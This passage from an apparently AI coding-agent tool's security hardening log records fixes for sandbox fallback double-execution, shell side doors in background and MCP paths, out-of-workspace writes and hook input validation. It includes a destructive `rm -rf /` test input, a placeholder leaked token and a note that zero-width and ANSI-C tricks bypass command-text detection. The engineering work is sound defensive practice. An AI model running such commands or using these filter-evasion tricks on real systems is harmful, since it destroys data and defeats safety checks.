`matrix.validate() == []`, `evidence.verify_evidence() == []`,
`verify_doc_numbers.py problems == []`.


---

## 28. Depth Round: Whether to Fall Back Is Decided by the RESULT (single `decided` contract)

Full reproduction in `CLAUDE_PARITY.md` section 16. **FOURTH calibration
of sections 13-15**: the previous round used `terminal_refusal` to block
only ONE refusal branch, while the fallback switch itself still used the
wrong field. NOT A SINGLE MATRIX STATUS CHANGED.

### G (most valuable): a command was executed TWICE in degraded deployments

`tools/shell.py::_route_sandbox_isolation` used
`verdict.enforced or verdict.backend_available` to decide whether to
accept the isolation result. But those are VERDICT fields (whether a
strong backend was used), NOT "did `execute_isolated` actually do
anything". With `enforce_required=false` and no strong backend, the
`local` branch of `_execute_backend` REALLY EXECUTED the command, yet
the route returned `None` and `run_shell` ran it a SECOND time via
`subprocess.Popen` in the real workspace. Measured: 1 isolated execution
+ 1 bare Popen, and `run_shell` returned the SECOND result
(`BARE_RAN`); the isolated result, sanitized env, egress verdict and
`last_egress` were all discarded. Any command with side effects ran
twice. **"No isolation backend available" does NOT mean "the command
has not run yet"** -- falling back to local IS an execution.

### Five more MEASURED disconnects

| ID | Measured result |
|---|---|
| F1 | `_run_provider` strong backend throws -> caught, returns `returncode=-1, enforced=False` -> same bare fallback |
| F2 | `subprocess.TimeoutExpired` -> same bare fallback |
| F3 | `copy_diff_apply`'s `isolate_workdir` throws -> outer `except` returns **`enforced=True` claiming "isolated execution"** (no copy was ever created), but the route only looks at `verdict.enforced` (still False) -> same fallback; `res.enforced` was NEVER consumed by the route |
| F4 | On `build_diff_preview` failure `error` concatenated `str(exc)` verbatim; measured `GITHUB_TOKEN=ghp_REAL_SECRET_VALUE` ECHOED BACK to the user; OSC 8 / RLO also reached the terminal |
| F5 | `copy_diff_apply` only blocked `terminal_refusal`; an execution timeout / crash returning `-1` still ran diff -> confirm, asking the user to approve writing back a copy that NEVER SUCCESSFULLY EXECUTED |

### Fix

| Location | Change |
|---|---|
| `sandbox/manager.py` | `SandboxExecResult` gains `decided: bool = True` (**fail-closed default**); the only `decided=False` is the `not verdict.isolate` branch. All `except` / timeout / diff-failure branches now use `safe_error_text(str(exc))` and explicitly set `decided=True`; `copy_diff_apply` also returns immediately on `returncode < 0`; the outer exception honestly reports `enforced=False` |
| `tools/shell.py` | The route no longer looks at `verdict.enforced / backend_available`, only `res.decided`; its own `except` branch is sanitized too and returns a terminal error instead of falling back |
| `core/security_utils.py` | New `safe_error_text()`: non-str takes only the type name (never `str()` on unknown objects, avoiding repr leaks) -> strips Cc/Cf/bidi/OSC controls -> reuses the existing `redact_sensitive()` -> caps at 400; dirty `limit` falls back to default and sanitization NEVER raises |

**Sanitize at the SOURCE, not at the exit**: when a user actively
declines a write-back, `res.error` contains the diff preview body and
the user MUST be able to see "what would have changed". A new
source-level regression locks "the exit does not call
`safe_error_text(res.error)`". `safe_error_text` does NOT do grapheme
clusters or display-width computation, so it does NOT constitute a
third width truth alongside the slogan UI cleaning layer.

### A-prime (self-introduced, self-caught)
The new `test_no_second_sanitization_at_route_exit` initially asserted
`count("safe_error_text") == 1`; measured was **2** -- the same `except`
branch contains both the import and one call, both inside its OWN
exception branch, not a second sanitization at the exit. The assertion
now checks "count == 2 + exit uses `res.error` verbatim + no
`safe_error_text(res.error`". A test assertion was wrong, not the code.

### Three "not changed on purpose" (each with an executable regression)
Unterminated-OSC parameter residue (ESC/BEL/RLO already stripped, so
the terminal cannot interpret it; residue only hurts readability);
global `redact_sensitive` behavior unchanged (not widened into the
shared primitive, to avoid affecting audit logs / MCP audit / export);
`cmd_safe.py` / `orchestration.py` are still not execution side doors
(section 15 source-scan regression reused).

### Matrix: NOT A SINGLE STATUS CHANGED
`aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
`b_waves_done=["B1"]`. Two catalog notes gained a FOURTH calibration
pointer (13 -> 14 -> 15 -> 16) but `status`/`evidence` structure is
unchanged; `matrix.validate()` and `evidence.verify_evidence()` both
empty. A new regression pins every count so no padding by editing
definitions.

### Honest limits
HTTPS CONNECT tunnel header injection still unavailable
(`credential_masking` stays `partial`); bwrap/seatbelt/seccomp have no
domain-level filtering and `allowed_domains` is still metadata;
**`decided` defaulting to True IS a behavioral change** -- third-party
integrations relying on the old fallback semantics must be reviewed;
`safe_error_text` covers only execution-layer exception messages, while
diff preview bodies are still echoed verbatim (if a preview contains a
secret, that is workspace file content, out of scope here);
`last_egress` is still not thread-safe; `undetectable` is a marker not
proof; `os_sandbox` remains a gap, `deny_network_by_default` remains
false, `block_writes_outside_wd` remains partial; no real-device
multi-platform verification -- the long
`test_platform_portability.py` batch reached only ~51% with zero
failures in the section-14 round and was NOT rerun here; the 1
`test_arch_security.py` failure was proven PRE-EXISTING by a
parent-blob BASELINE CONTROL, with NO policy relaxation to make it
green. A-line still has 10 pending modules, the local fork remains
unmerged, no third-party adaptive red team. The slogan engine /
cleaning layer / `mapping.py` / `tui.py` are byte-identical to parent.

### Verification (split batches, NOT claimed as one full-suite run)
this round + previous three + boundaries + claude_parity **227 passed**;
shell-routing impact **99 passed**; parity + config + security
regression **170 passed**; sandbox/platform/proc/e1e7 per-file
**130 passed total** (batches overlap, NOT summed);
`matrix.validate() == []`, `evidence.verify_evidence() == []`,
`verify_doc_numbers.py problems == []`.


---

## Depth Round (continued): Two Execution Side Doors Closed -- Background `! cmd` and Outbound MCP `run_shell`

> **Section-number calibration**: section 17 of THIS file is "Runtime
> Closed-Loop"; section 17 of `CLAUDE_PARITY.md` is "Self-Healing /
> Evidence Preservation"; section 17 of `SECURITY_EN.md` history is
> "Owner Normalization"; `SLOGAN_MAPPING.md` has yet another section 17.
> The previous round's background-branch comment cited "this round's
> section 17" and pointed at NOTHING. This round uses SELF-CONTAINED
> headings and rewrites the code comment accordingly; no global
> renumbering (that would churn many existing cross-references and turn
> a wording problem into a new one). Full reproduction: the final
> section of `CLAUDE_PARITY.md`.

Two rounds pushed together. **NOT A SINGLE MATRIX STATUS CHANGED**:
`aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
`b_waves_done=["B1"]`.

### Measured gaps

| Location | Measured result |
|---|---|
| Background `! cmd` | In `run_shell`, the `is_bg_command` branch returns BEFORE both `_pre_exec_guard` and `_route_sandbox_isolation`. With an `isolate=True` verdict: isolation layer called **0 times**, bare `Popen` **1 time**, returned "background started". The `decided` contract governs only the main-route return value and CANNOT reach here |
| Background env | `BackgroundShellManager.start`'s `Popen` passed NO `env`; the child inherited the full parent environment. Measured: a real `GITHUB_TOKEN` entered an async process subject to no egress control whatsoever |
| MCP M1 | `ecosystem/mcp_server.py::_h_run_shell` is the ONLY entry where an EXTERNAL AGENT supplies `command` and it runs with `shell=True`; it did only `is_hard_redline` / `is_redline` TEXT checks, never `SandboxManager.assess_command` / `plan_egress`. Fuzzing already proved zero-width chars / ANSI-C / comment-newline bypass text-layer detection |
| MCP M2 | `subprocess.run` passed no `env`; measured `GITHUB_TOKEN=ghp_REAL_SECRET_VALUE` entered the child verbatim, directly contradicting sections 13/15 ("child processes never hold real secrets") |
| MCP M3 | `str(exc)` echoed verbatim to the external Agent: real key strings, OSC 8 / RLO leaked (both execution-failure and safety-decision-failure branches) |
| Global | In `f"{type(exc).__name__}: {safe_error_text(str(exc))}"`, `str(exc)` executes in the CALLER. Measured: an exception whose `__str__` raises topples the entire `except` branch, turning a safety error path into an uncaught exception. 5 more bare `{exc}` echoes in `shell.py`, 1 in `background_shell.py`, 3 in MCP |

### Fix

| Location | Change |
|---|---|
| `core/security_utils.py` | New `safe_exception_text(exc)`: wraps `str(exc)` in try; on failure discards the text and keeps only the type name; otherwise reuses `safe_error_text`. ALL 12 error exits now go through it |
| `tools/shell.py::_start_background` | `isolate=True` -> **FAIL-CLOSED REFUSAL** (an async path cannot use the synchronous isolation executor / copy-diff-apply confirmation; NEVER pretend isolation happened). Other background commands explicitly receive a `sanitize_env()` sanitized environment plus restored `TUAN_WORKSPACE` |
| `core/background_shell.py` | `start` / `run_in_background` gain an `env` parameter (`None` preserves legacy inheritance for backward compatibility), forwarded to `Popen`; background-thread terminal failure sanitized |
| `ecosystem/mcp_server.py` | Wired to `SandboxManager.assess_command` (DENY / CONFIRM / `isolate=True` ALL fail-closed) + `plan_egress(verdict, "local", ...)` (`allowed=False` refused, `plan.env` sanitized values explicitly passed to `subprocess.run`); all exception exits sanitized; tool description honestly states "NO OS-level isolation / per-command domain binding / copy confirmation" |
| `sandbox/manager.py` | 5 `safe_error_text(str(exc))` -> `safe_exception_text(exc)` |

**backend is fixed to `local`**: MCP is a synchronous bare subprocess;
we NEVER take a strong-backend name from the verdict and pretend
isolation happened. Default `allow_dangerous_tools=false` behavior
unchanged.

### Three "not changed on purpose" (each with an executable regression)
`ignored` is a dead field (ZERO constructor sites repo-wide) and does
NOT conflict with `decided=True`; kept for compatibility, locked by a
source scan. `verdict.enforced` now has NO consumer repo-wide but is
NOT deleted (deleting changes verdict object state that external
integrations may read). `artifact_tool.py` / `code.py` `Popen` calls
open editors/files, do NOT execute user-supplied shell commands, and
are recorded honestly but untouched.

### A-prime x2 (self-introduced, self-caught)
The bulk replacement broke TWO multi-line f-string concatenations ->
`py_compile` SyntaxError; fixed with string `+`. The previous round's
`test_no_second_sanitization_at_route_exit` used a fixed 2600-character
window slice; a lengthened comment pushed the `except` branch out of
the window, and the real code uses `safe_exception_text` anyway. The
assertion now uses `inspect.getsource` for the full function body.
Both were test/replacement fragility, NOT code regressions.

### Matrix: NOT A SINGLE STATUS CHANGED
`status` / `evidence` structure unchanged; two catalog notes gained
fifth/sixth calibration pointers; `matrix.validate()` and
`evidence.verify_evidence()` both empty. New regressions pin every
count so no padding by editing definitions.

### Honest limits
The MCP channel STILL has NO OS-level isolation / per-command domain
binding / copy confirmation -- this round does fail-closed refusal +
sanitized env, NOT those capabilities. `credential_masking` stays
`partial` (headers invisible inside an HTTPS CONNECT tunnel). Both
background and MCP ARE behavioral changes. When `ctx` has no
`_sandbox_verdict` the background path does not block (an UPSTREAM
verdict-chain boundary; this round does NOT fabricate a verdict or
guess risk from text, which would reintroduce the "look at the string"
bypass surface). `safe_exception_text` covers only exception messages;
diff preview bodies are still echoed verbatim. `os_sandbox` remains a
gap, `deny_network_by_default` remains false,
`block_writes_outside_wd` remains partial. NO real-device multi-platform
verification; long batches hit repeated 502/timeouts so split batches
are reported as such, NOT claimed as one full-suite run. The 1
`test_arch_security.py` failure was proven PRE-EXISTING by a
parent-blob BASELINE CONTROL; NO policy relaxation to make it green.
A-line still has 10 pending modules, the local fork remains unmerged,
no third-party adaptive red team. The slogan engine / cleaning layer /
`mapping.py` / `tui.py` are byte-identical to parent.

### Verification (split batches, NOT claimed as one full-suite run)
this round + parallel line + previous four **276 passed**;
shell/background impact **82 passed**; parity + config + security
regression **78 passed**; sandbox/platform/proc/e1e7 per-file
**130 passed** (carried from section 16); `verify_doc_numbers.py
problems == []`. Batches overlap and are NOT summed. New
`tests/test_b2se_background_side_door.py` (~24 cases) and
`tests/test_b2su_mcp_shell_gate.py` (~25 cases).


---

## Depth Round (continued II): Tool-Layer Write Boundary, `/add-dir` Calibration, Real `edit_files` Transaction

> SELF-CONTAINED heading (no new numeric section number -- this file,
> `CLAUDE_PARITY.md`, `SECURITY_EN.md`, `SLOGAN_MAPPING.md` each have a
> section 17 referring to four DIFFERENT topics). Full reproduction: the
> final section of `CLAUDE_PARITY.md`. **NOT A SINGLE MATRIX STATUS
> CHANGED**.

### Measured defects

| ID | Measured result |
|---|---|
| W1 | `permissions.blockWritesOutsideWorkingDirectories` had **ZERO hits in code** (only in the catalog comparison note). `tools/filesystem.py::_resolve` is a READ-path decision that does not distinguish read from write; CC v2.1.314 hard-refuses out-of-tree writes at the **Write/Edit/NotebookEdit tool layer** |
| W2 | THREE places (REPL help, `authorize_extra_dir` docstring, module comment) all claimed "readable context / read-only; writes still go through existing guards". Measured: after `/add-dir /tmp/ext`, `write_file` REALLY created a file, `move_file` renamed, `delete_file` deleted -- all outside the workspace. **A confirmation dialog is NOT a path boundary**: YOLO / unattended / direct function calls never pass through it |
| W3 | `edit_files` claimed "any failure -> whole transaction refused, no file written", but the dangerous-content scan ran in PHASE 2 WHILE WRITING. Measured: with 3 items and `rm -rf /` in the third, it returned "wholesale refused (no file written)" while `f0.txt` / `f1.txt` had ALREADY become `BBB` |

W3 is a rare **correctness defect** in this repo (most prior rounds were
security fail-opens), and the return text actively LIES, misleading the
calling Agent into thinking a safe retry is possible.

### Fix

| Location | Change |
|---|---|
| `core/write_boundary.py` (NEW) | Single decision exit. Flag defaults to **`False`** (matches CC factory default, **NO breaking default change**); a non-bool config value -> **FAIL-CLOSED ENABLE** (avoids Python's `bool("false") == True` silent allow); when on, write targets must be inside `workspace UNION explicitly writable-granted roots`; the write point re-resolves the parent chain to catch symlink-swap TOCTOU |
| `tools/filesystem.py` | New `_resolve_write`; ALL SIX write ops uniformly routed through it; `move_file`'s SOURCE still uses `_resolve` (read decision); one extra recheck at the write point |
| `tools/filesystem.py` `authorize_extra_dir` | New `writable=False`; plain `/add-dir` grants READ ONLY, `--writable` explicitly registers a writable root (per-session memory state, NO Agent self-grant tool), system-critical directories still refused |
| `tools/filesystem.py` `edit_files` | Dangerous-content scan MOVED INTO PHASE 1; a recheck over ALL targets BEFORE any disk write; PHASE 2 loop no longer contains ANY rejection branch |
| `config/defaults.py` / `security_schema.py` / `cli/cmd_harden.py` | New flag; non-bool is a hard error (so runtime does not silently change behavior under fail-closed), enabling emits a "behavior change" warning; `harden status` shows the CURRENT effective state |
| `cli/cmd_slash.py` | `/add-dir` help made honest, supports `--writable`, no-arg listing distinguishes writable / read-only-or-default |
| `parity_claude/catalog.py` | `block_writes_outside_wd` note calibrated, **`status` STAYS `partial`**, `evidence` structure unchanged |

### Why it stays `partial`, NOT `aligned`
1. **Command-layer redirects are outside a tool-layer constraint**:
   `echo x > /tmp/out` runs via shell; CC covers that with sandbox rules,
   Tuan has no equivalent yet.
2. **Factory default is still `false`** (same as CC, but neither is a
   default strong boundary).
3. **TOCTOU only does a second resolution**: a window remains between
   the check and `os.replace`; full elimination needs `O_NOFOLLOW` +
   `dir_fd`, which would change the existing atomic-write implementation.
   Not claimed as covered.

### Three "not changed on purpose" (each with an executable regression)
READ paths unaffected (`read_file` / `list_dir` / `glob` / `diff_preview`
still read `/add-dir` dirs normally); `artifact_tool.py` /
`worktree_layer.py` write to FIXED INTERNAL paths
`workspace/.tuan/artifacts` and `workspace/.tuan/worktrees`, not
user-supplied arbitrary paths (locked by a source scan); `move_file`'s
source is a READ and its destination a WRITE -- gating the source too
would wrongly refuse "move from an authorized read-only dir into the
workspace".

### A-prime
The first `harden status` draft gave `_CfgProbe` a `get()` method, but
`write_boundary` reads `ctx.config()`; it also called `allowed_roots()`,
which needs `ctx.workspace`. Self-check fixed it to `config()` and removed
the workspace dependency. One dead test helper was cleaned up.

### Matrix: NOT A SINGLE STATUS CHANGED
`aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
`b_waves_done=["B1"]`; `matrix.validate()` and
`evidence.verify_evidence()` both empty. New regressions pin every count
so NO padding by editing definitions.

### Honest limits
**Default behavior UNCHANGED**: with `false`, `/add-dir` dirs remain
writable; the docs were corrected (the old wording was WRONG). Enabling
the flag AND the W3 fix ARE behavioral changes: deployments relying on
"add-dir is writable" need an explicit `--writable` grant or must stay
off; `edit_files` now writes ZERO files when dangerous content is hit
(the old version wrote the first N), so callers relying on "partial
success" must review -- but the old return text already claimed "no file
written", so the fix aligns implementation with its promise. If
`_atomic_write_text` fails mid-PHASE-2 due to an OS error (disk full /
permissions), partial writes are still possible -- NOT introduced this
round and NOT claimed as "fully transactional". `os_sandbox` remains a
gap, `deny_network_by_default` remains false, `credential_masking`
remains partial; A-line still has 10 pending modules, the local fork is
unmerged, no third-party adaptive red team. NO real-device multi-platform
verification; Windows paths untested. The slogan engine / cleaning layer /
`mapping.py` / `tui.py` / `runtime_slogans.py` are byte-identical.

### Verification (split batches, NOT claimed as one full-suite run)
this round **38 passed**; path/edit/read-guard/workspace impact (6 files)
**119 passed / 1 skipped**; config/harden/slash/parity (7 files)
**114 passed**; `verify_doc_numbers.py problems == []`; 8 changed Python
files `py_compile` OK. End-to-end measured: flag off preserves legacy
add-dir writes; flag on refuses write/edit/move/delete/delete_dir with
ZERO disk change while reads still work; `--writable` allows; the W3
scenario leaves all three files at `AAA`. Batches overlap, NOT summed.


---

## B3 Depth Round: Extended Hook Events, CC Native Protocol, `updatedInput` Schema Validation

> SELF-CONTAINED heading. Full reproduction: the final section of
> `CLAUDE_PARITY.md`. **NOT A SINGLE MATRIX STATUS CHANGED**:
> `aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
> `b_waves_done=["B1"]`.

### Measured defects

| ID | Measured result |
|---|---|
| R1 | `HookManager.__init__` iterated only 8 `HOOK_EVENTS`; a `DirectoryAdded` block, or a typo like `PermissionReqest`, was SILENTLY DROPPED with zero error -- same class as the previously fixed "silently ineffective rules table" |
| R2 | If decision-type events were routed through `run_notify`, their stdout was silently swallowed: the user thinks an interceptor is installed while NOTHING happens |
| R3 | `_parse_decision` only understood `args` / `block` / `decision`. A hook written per the official Claude Code docs (`hookSpecificOutput` with `permissionDecision` / `updatedInput`) evaluated to `None` and was `continue`d -- neither blocking nor rewriting |
| R4 | A hook returning `{"args":{"path":"ok","TOTALLY_UNKNOWN":"pwn"}}` was accepted verbatim, and `tool.handler(ctx, **args)` raised `TypeError` (unexpected keyword + missing required argument) |

Official behavior: since CC v2.1.300 `updatedInput` REPLACES the whole
`tool_input`, unknown keys are dropped, and a rewrite missing required
params or with wrong types DENIES the call.

### Fix

| Location | Change |
|---|---|
| `hooks/manager.py` | Event table 8 -> 15; unknown event keys produce an explicit `unknown_hook_event` audit; 4 decision-type events get an independent `run_decision()` exit (reusing B1 fail-closed), misrouting to the notify channel is logged and refused; `_parse_decision` now handles CC native `hookSpecificOutput` plus legacy formats; `ask` fails closed without a confirmation channel; advisory `additionalContext` has no local injection channel so it is logged, not faked |
| `hooks/input_validation.py` (NEW) | With a schema: drop unknown keys via the `properties` allowlist, validate `required` / `type` / `enum`; any violation -> deny (`run_pre` converts to `block=True` + `invalid_updated_input`). Without a schema: conservative subset constraint (no new keys beyond the original args), `enforced=False` -- NEVER packaged as "schema validated" |
| `tools/base.py` | Passes `tool_schema=tool.parameters`; dispatches `PermissionRequest` before dangerous-tool approval, NARROWING ONLY (a hook's `allow` must NOT skip `ctx.confirm` -- that is a security gate, not UX) |
| `cli/cmd_slash.py` | Dispatches `DirectoryAdded` only after a SUCCESSFUL `/add-dir` grant (failures do not trigger), forwarding `--writable` |
| `arch/execution.py` | `ToolCall` gains an optional `tool_schema` forwarded to `run_pre`; existing callers that omit it still take the conservative subset |

### Why the two B3 entries STAY `STATUS_GAP`
`ConfigChange` / `WorktreeCreate` / `Elicitation` /
`ElicitationResult` plus `Notification` have NO local production
trigger (configured hooks never fire == the capability does not exist).
The official hooks reference lists far more events than these 7.
`arch/execution.py` / `cmd_hooks.py` side paths have no schema.
Catalog notes were calibrated but `status` / `evidence` structures are
UNCHANGED -- NO padding by editing definitions.

### Three existing assertions synchronized (NOT relaxed)
The event-surface assertion moved from 8 to 15 with NEW per-event
enumeration of the 7 extended events; two "hook may inject a new key"
assertions became "existing-key rewrite still works AND the new key is
dropped" -- stronger and more accurate.

### A-prime
When `_parse_decision` became an instance method, the replacement did
not include the `@staticmethod` decorator above it, so 12 existing
hooks tests failed with `TypeError`. Self-check removed the decorator.
Replacement fragility, NOT a code regression.

### Matrix: NOT A SINGLE STATUS CHANGED
`matrix.validate()` and `evidence.verify_evidence()` both empty; new
regressions pin every count.

### Honest limits
5 extended events have an engine but NO production trigger; CC
exit-code-2 -> decline is NOT implemented; schema-less side paths are
only a conservative subset; `PermissionRequest` is deliberately
STRICTER than CC; BEHAVIORAL CHANGE: hook rewrites can no longer inject
new keys (previously a `TypeError`), and the legacy `{"args":...}`
format goes through the same validation with NO side door.
`os_sandbox` remains a gap, `deny_network_by_default` remains false,
`credential_masking` remains partial; A-line still has 10 pending
modules, the local fork is unmerged, no third-party adaptive red team.
NO real-device multi-platform verification. The slogan engine /
cleaning layer / `mapping.py` / `tui.py` / `runtime_slogans.py` are
byte-identical.

### Verification (split batches, NOT claimed as one full-suite run)
B3 new regressions + 5 existing hooks files **83 passed**;
parity / write boundary / two side doors / B2 waves / config / slash
**356 passed**; `verify_doc_numbers.py problems == []`; `py_compile`
all OK. New `tests/test_b3_hooks_extended.py`. Batches overlap, NOT
summed.


---

## B3 Continued: Production Triggers for 5 Extended Events + Side-Path Contracts

> SELF-CONTAINED heading. Full reproduction: final section of
> `CLAUDE_PARITY.md`. **NOT A SINGLE MATRIX STATUS CHANGED**:
> `aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
> `b_waves_done=["B1"]`.

### Four measured defects

| ID | Measured result |
|---|---|
| R1 | All 5 extended events registered successfully, yet after running real operations (`Config.set_user` / `WorktreeLayer.create` / `_ask_user_handler` / `remote_control.notify`) hooks fired **0 times**, and a repo-wide scan found **0 dispatch sites** for the 5 events -- config loads, the engine decides, but NO production code calls them |
| R2 | `tuan hooks test --event PermissionRequest` went through `run_session` -> `run_notify` and was refused by `decision_event_misrouted`, silently doing nothing; the CLI test entry was dead for all 4 decision-type extended events |
| R3 | `cmd_hooks.run_pre` passed no schema, so the manual test entry only got the conservative subset |
| R4 | `ToolPipeline` has **NO production constructor** (tests only), so the previous round's "side-path fix" did not widen real coverage; forcing `tool_schema=` also made a legacy hook mock raise `TypeError`, failing 1 existing regression |

### Fix

| Location | Change |
|---|---|
| `hooks/triggers.py` (NEW) | Single `HookTrigger` exit for 5 events: notify-type through `run_notify`, decision-type through `run_decision`; **strict no-op without hooks**, notify exceptions swallowed, and if the user DID configure hooks but the decision channel breaks -> **fail-closed**. `set_default_hooks_provider()` injects a read-only getter, not a copied HookManager |
| `config/loader.py` / `config/managed.py` | `set_user` / `delete_user` / `reload` success -> `ConfigChange` (failures do NOT dispatch) |
| `core/worktree_layer.py` | `create` / `create_agent_worktree` dispatch `WorktreeCreate` BEFORE ANY filesystem change; a block raises `WorktreeError`. Deliberately before the fast-resume reuse branch (stricter than CC, documented) |
| `tools/session_tools.py` / `runtime/acp/bridge.py` | `Elicitation` / `ElicitationResult`: can CANCEL a question / VOID an answer, but **NEVER answer on the user's behalf and NEVER overwrite the user's answer** (CC allows programmatic answers; Tuan deliberately does not -- the model must not answer its own question). Headless downgrades with no real response do NOT dispatch ElicitationResult |
| `core/remote_control.py` / `core/security_alert.py` | `Notification` before ALL return paths / inside the background thread, so hook subprocesses never block `_pre_exec_guard` |
| `cli/cmd_hooks.py` / `arch/execution.py` | Decision events route to `run_decision`; `run_pre` takes a schema (missing -> honestly printed as `enforced=False`); `ToolPipeline` gains `schema_resolver` and only passes the keyword when a schema exists |
| `app.py` / two worktree entries | Injects `lambda: agent.ctx.hooks`; `/worktree` passes hooks explicitly |

### Why the two B3 entries STAY `STATUS_GAP`
The official hooks reference lists far more events than these 7; CC
exit-code-2 -> decline is NOT implemented; `Elicitation` semantics are
deliberately NOT equivalent; `ToolPipeline` has no production call chain;
`cmd_hooks` schema lookup depends on the kernel exposing `tool_registry`.
Catalog notes were calibrated but `status` / `evidence` structures are
UNCHANGED -- NO padding by editing definitions.

### Three assertion synchronizations (NOT relaxed)
The "5 events have no trigger" assertion became a per-item check of 5
methods + 11 wiring sites + provider + classification (STRONGER); the
existing `FakeHooks` test in `test_arch_security_fixes.py` is BYTE-IDENTICAL
and unmodified; all other count/classification assertions untouched.

### A-prime x2 (self-caught)
1. `remote_control.notify` has an early `rc is None: return False`; the
   first version put the Notification dispatch at the end, so it would
   NEVER fire without a push target. Moved before all return paths.
2. `ToolPipeline` forcing `tool_schema=` broke a legacy hook mock. Now
   the keyword is passed only when a schema exists. Both are wiring
   fragility, NOT pre-existing code regressions.

### Verification (split batches, NOT one full-suite claim)
B3-continued + previous B3 + 5 existing hooks files **97 passed**; final
combined batch (see report); `matrix.validate()` /
`evidence.verify_evidence()` / doc-number check / `py_compile` all clean.
New `tests/test_b3s_triggers.py` includes a REAL `git init` + REAL
`git worktree add` end-to-end firing of all 5 events.

### Honest limits
7 events having triggers != full event-surface parity; `ToolPipeline` has
no production call chain; BEHAVIORAL CHANGES (WorktreeCreate can now really
deny, Elicitation can cancel/void, Config/notify now dispatch configured
hooks); Notification fires on a background thread; `os_sandbox` remains a
gap, `deny_network_by_default` remains false, `credential_masking` remains
partial; A-line 10 pending, local fork unmerged, no third-party adaptive
red team; NO real-device multi-platform verification. The slogan engine /
cleaning layer / `mapping.py` / `tui.py` / `runtime_slogans.py` are
byte-identical.


---

## B3 Continued V: The Second Layer AFTER Wiring (Write Persistence / Reentry / Classification Truth / Cross-Session Visibility)

> SELF-CONTAINED heading. NOT A SINGLE MATRIX STATUS CHANGED:
> `aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
> `b_waves_done=["B1"]`. Both B3 catalog entries stay `STATUS_GAP`;
> `catalog.py` is UNCHANGED this round. Full reproduction: final
> section of `CLAUDE_PARITY.md`.
>
> The previous round wired 5 extended events to production triggers.
> This round asks ONE question: "now that it is wired, can it fire at
> the WRONG time, into the WRONG session, or FOREVER?" NO breadth added.

### Six candidates (4 fixed / 2 deliberately not)

| ID | Measured result | Verdict |
|---|---|---|
| C1 | Pointing `user_config_path` at a directory makes `dump_yaml` swallow `IsADirectoryError` and return `None`; `Config.set_user` STILL dispatches `ConfigChange` even though **NO file exists on disk** | FIX -- directly contradicts the previous round's own `ManagedSettings.reload` contract ("do not dispatch on failure") |
| C2 | An in-process hook calling `Config.set_user` inside `run_notify` recursed **247 levels**; `dump_yaml` swallowed `RecursionError` too, so every level kept dispatching -- no error, no stop | FIX |
| C3 | The previous round's classification test only checked strings inside `triggers.py`, NOT the real `_NOTIFY_EVENTS` / `_DECISION_EVENTS` constants in `manager.py` | NO code change; add a TRUTH regression against the constants |
| C4 | After `set_default_hooks_provider(A)` / `(B)`, a trigger built under A dispatched **0 to A and 1 to B** -- process-level provider is a single-session assumption, silently cross-wired | PARTIAL FIX |
| C5 | `ConfigChange` payload contains only `source/key/origin`, NOT the config value | NOT a bug; lock it with a regression |
| C6 | `delete_user` returning False does not dispatch | NOT a bug (already correct); lock it |

### Fix
- `config/loader.py`: split out `_dump_yaml_impl`, add `dump_yaml_checked`
  that HONESTLY reports whether the write landed. **`dump_yaml` still
  returns `None`, still swallows exceptions, byte-for-byte unchanged in
  behavior** (all existing callers ignore the return value). `set_user` /
  `delete_user` dispatch only when `ok`; new `last_write_persisted` for
  diagnostics. Deliberately NO read-back value comparison: safe_dump /
  safe_load serialization differences cause false negatives, and a
  read-back would introduce a "decision depends on a filesystem point
  in time" cache -- the same reason earlier rounds rejected caching for
  liveness decisions.
- `hooks/triggers.py`: **thread-local reentry guard**. Same-thread,
  same-event reentry: notify-type is skipped and counted; decision-type
  is **fail-closed** with `failure_kind="reentry_suppressed"` (NEVER an
  empty allow decision, otherwise recursion becomes a security bypass).
  `try/finally` cleanup so the same event can fire again after an
  exception; concurrent same-event dispatch from DIFFERENT threads is
  NOT suppressed. Cross-process command hooks need NO guard: a child
  process does not inherit the parent's thread-local, so that recursion
  chain cannot form -- documented, NOT overstated.
- `app.py`: explicitly backfills `config._hooks` with this session's
  hooks. Config is constructed earliest and lives longest, so it was
  the main C4 chain; `/worktree` and `ask_user` already passed hooks
  explicitly in the previous round.
- `set_default_hooks_provider(..., owner=...)` + `provider_diagnostics()`:
  cross-wiring is **NOT eliminated, only made DIAGNOSABLE** (owner /
  generation / overrides / reentry). Module-level `remote_control.notify`
  / `SecurityAlerter` background thread still use the global fallback;
  true multi-session isolation requires the upstream to pass an owner
  to those entries. This round deliberately does NOT change 5 subsystem
  signatures just to make wiring more brittle.

### Why both B3 entries STAY `STATUS_GAP`
The official hooks reference lists far more events than 7; CC
exit-code-2 -> decline is NOT implemented; `Elicitation` semantics are
deliberately NOT equivalent; `ToolPipeline` has NO production
constructor; `cmd_hooks` schema lookup depends on the kernel exposing
`tool_registry`. This round fixed the CORRECTNESS of already-wired
triggers, not coverage. `catalog.py` unchanged -- NO padding by
editing definitions.

### Assertion synchronization (NOT relaxed)
`tests/test_b3s_triggers.py` and `test_b3_hooks_extended.py` are
BYTE-IDENTICAL and unmodified; C3 was upgraded from a string check to
a check against `manager.py` constants; every matrix count is pinned.

### A-prime x2 (self-caught, in NEWLY WRITTEN TESTS)
1. The "failed delete" test pointed the path at a directory, but
   `_load_yaml` then could not find the key and `delete_user` returned
   False BEFORE reaching the write -- wrong branch. Switched to
   monkeypatching the write exit to return False. `set_user` failure is
   covered by the real-directory C1 case.
2. The child-process check assigned `str` to `c.home`, so
   `_load_yaml` calling `path.exists()` raised `AttributeError`.
   Switched to `Path(...)`. ZERO product-code regressions.

### Verification (split batches, NOT one full-suite claim)
B3-V + previous B3 + 5 existing hooks files + mixin + config series
**182 passed**; wide combined batch (see report); `matrix.validate()` /
`evidence.verify_evidence()` / doc-number check / `py_compile` all clean.
New `tests/test_b3v_depth.py` includes a REAL child process proving
thread-local non-inheritance, 4-thread concurrent non-suppression,
decision-reentry fail-closed, single-implementation scan, matrix pinning.

### Honest limits
C4 is NOT fully fixed (module-level entries can still cross-wire, only
diagnosable); cross-process hooks are NOT protected by the guard;
on a failed write the in-memory view is STILL updated (pre-existing
behavior, lost on restart); NO read-back comparison, concurrent external
config rewrites are out of scope; BEHAVIORAL CHANGES (failed writes no
longer dispatch ConfigChange, app.py backfills `config._hooks`);
`os_sandbox` remains a gap, `deny_network_by_default` remains false,
`credential_masking` remains partial; A-line 10 pending, local fork
